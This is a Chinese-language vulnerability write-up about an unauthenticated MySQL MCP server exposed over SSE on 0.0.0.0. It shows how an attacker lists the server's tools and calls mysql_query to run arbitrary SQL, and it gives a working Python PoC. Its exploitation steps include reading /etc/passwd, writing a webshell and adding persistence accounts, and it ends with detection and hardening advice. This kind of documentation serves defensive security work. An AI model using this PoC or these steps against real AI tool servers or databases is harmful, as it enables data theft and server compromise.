---
id: ai-security-mcp-security-mysql-mcp-sse-unauth-sql-query
title: MySQL MCP SSE 服务未授权：绑定 0.0.0.0 无鉴权，任意客户端调用 mysql_query 执行 SQL
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: mysql-mcp-sse-unauth-tool-invocation-sql
aliases:
- mysql-mcp-server-sse 未授权
- MCP SSE 未授权访问
- mysql_query 工具调用
- MCP 工具函数漏洞
- 0.0.0.0:3000/sse
tags:
- mcp
- mysql
- sse
- unauthenticated
- tool-invocation
- sql
- ai-security
- fastapi
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V164
  verified_at: '2026-11-06T09:54:23+08:00'
  notes: 已对照原文与图 07/09-12 核对：.env HOST=0.0.0.0/PORT=3000 与 MySQL 连接配置、FastMCP(host=host, port=port)、工具 mysql_show_databases/mysql_show_variables/mysql_show_foreign_keys/mysql_paginate_results/mysql_query、官方 SDK sse_client+ClientSession 未授权 initialize/list_tools/call_tool、SHOW DATABASES 返回 information_schema/ry，均一致；原文未给版本区间，不设 affected_versions。未验证点：PoC 未本机复跑（原文截图已显示调用成功）；frontmatter 无 sources/source_url。
---

## 一句话结论

`mysql-mcp-server-sse` 默认从 `.env` 读取 `HOST=0.0.0.0`、`PORT=3000` 并以无鉴权的 SSE/HTTP 模式启动 MCP 服务；任何能访问该端口的客户端都可以完成 MCP 初始化、列出工具并直接调用 `mysql_query`，用服务端配置的数据库账号执行任意 SQL，读取/修改数据库甚至利用 `LOAD_FILE`/`INTO OUTFILE` 读写文件。

## 原理

- MCP（Model Context Protocol）服务器有两种传输模式：stdio（本地子进程）与 SSE/HTTP（网络服务）。SSE 模式本质是一个 HTTP 服务，通常用 FastAPI/FastMCP 实现；**它不会自动提供认证**，是否鉴权完全取决于服务端代码。
- 该项目的 `.env` 示例把 `HOST=0.0.0.0`、`PORT=3000`、`MYSQL_HOST/PORT/USER/PASSWORD/DATABASE` 写在一起；启动时 `ServerConfig.HOST/PORT` 直接传给 `FastMCP(..., host=host, port=port)`，因此服务监听所有网卡而非回环。
- 服务注册的工具包括 `mysql_show_databases`、`mysql_show_variables`、`mysql_show_foreign_keys`、`mysql_paginate_results`、`mysql_query` 等；其中 `mysql_query(query, params)` 接收任意 SQL 并通过配置的数据库连接执行。
- MCP 协议本身是“客户端先 initialize，再 tools/list，再 tools/call”；由于没有认证/授权，攻击者可以伪装成合法 MCP 客户端，走完整个握手并调用任意工具。工具描述（description）会直接暴露参数格式和数据库结构提示。
- 最终危害取决于 MySQL 账号权限：普通账号可拖库/改数据；具备 `FILE` 权限时可用 `LOAD_FILE()` 读服务器文件、`INTO OUTFILE` 写 webshell；若账号是高权限/root，可进一步提权。
- 本质：把“本地 AI 助手工具”当成可信组件，却把网络监听地址设为 `0.0.0.0` 且不实现认证；MCP 工具函数等价于一组 RPC 方法，暴露到网络就等于把数据库/命令执行能力开放给所有人。

## 触发条件

- 目标运行 `mysql-mcp-server-sse` 或类似 SSE 模式的 MCP 服务，`HOST` 为 `0.0.0.0`/公网可达地址。
- 服务未实现 token/API Key/反向代理认证，任何来源都能访问 `/sse`。
- 注册了可执行任意 SQL、命令、文件读写的工具（本例 `mysql_query`）。
- 配置的 MySQL 账号具有对敏感库表的读/写权限，或具备 FILE 等高级权限。

## 利用步骤

1. 扫描/发现 MCP SSE 端口（常见 3000、8000 等），访问 `/sse` 确认返回 SSE 事件流。
2. 使用官方 `mcp` Python SDK 的 `sse_client` 连接 `http://target:3000/sse`，建立 `ClientSession` 并 `initialize()`。
3. 调用 `list_tools()` 枚举工具及描述，确认存在 `mysql_query` 等危险工具。
4. 调用 `mysql_query` 执行 `SHOW DATABASES;`，确认数据库连接与权限。
5. 进一步执行 `SHOW TABLES`、`SELECT * FROM users`、`LOAD_FILE('/etc/passwd')`、`INTO OUTFILE` 等，按权限拖库/读写文件。
6. 若需要持久化，可通过 SQL 创建账号、写定时任务（配合 FILE/提权）或修改业务数据。

## PoC

```python
import asyncio
from mcp.client.sse import sse_client
from mcp.client.session import ClientSession

async def run():
    url = "http://target:3000/sse"
    async with sse_client(url) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as session:
            await session.initialize()
            tools = await session.list_tools()
            for tool in tools.tools:
                print(f"- {tool.name}: {tool.description}")

            result = await session.call_tool(
                "mysql_query",
                arguments={"query": "SHOW DATABASES;"}
            )
            print(result)

if __name__ == "__main__":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(run())
```

```text
# 返回示例（文章截图）：
# Result: content=[TextContent(type='text',
#   text='{"metadata_info": {"operation_type": "SHOW", "result_count": 2},
#          "results": [{"Database": "information_schema"}, {"Database": "ry"}]}')]
```

## 变体与关联

- 其他数据库 MCP：PostgreSQL/SQLite/MongoDB/Redis 的 MCP 服务器若同样以 SSE 暴露且无鉴权，工具函数可执行任意查询/命令；审计时先看 `HOST` 与认证中间件，再看工具实现。
- 命令执行型工具：MCP 工具中调用 `subprocess`/`os.system`/`child_process.spawn` 且参数可控时，未授权访问直接升级为 RCE（参见 MCPJam `/api/mcp/connect`、MCP Inspector stdio 等）。
- 文件型工具：`read_file`/`write_file`/`list_dir` 等未做路径限制时，可读敏感文件或写 webshell。
- 关联：[[ai-security-mcpjam-inspector-api-mcp-connect-rce]]（serverConfig command/args 未授权 RCE）、[[ai-security-mcp-security-inspector-cors-stdio-rce]]（MCP Inspector 宽 CORS + stdio 参数）、[[ai-security-mcp-security-tool-idor-document-pii-leak]]（MCP 工具对象级鉴权缺失）。
- 边界：若服务绑定 127.0.0.1、前置了认证代理、或数据库账号只有只读最小权限，危害会显著降低；纯 stdio 模式不暴露网络端口，需通过本地进程/恶意配置利用。

## 检测与防御

- 检测：扫描 `/sse` 端点与 MCP `initialize` 握手；检查 `.env`/启动参数中的 `HOST=0.0.0.0`；对 `tools/list` 响应中出现 `mysql_query`、`exec`、`read_file` 等危险工具告警；审计 MCP 服务的认证中间件是否存在。
- 修复：默认绑定 `127.0.0.1`；SSE 模式强制 token/API Key 或 mTLS；不要把数据库 MCP 暴露到公网，远程访问走 SSH 隧道/VPN。
- 加固：数据库账号使用只读、最小权限；`mysql_query` 改为参数化查询 + SQL 白名单/只读模式；禁用 `LOAD_FILE`/`INTO OUTFILE`/多语句；对工具调用做审计和速率限制。
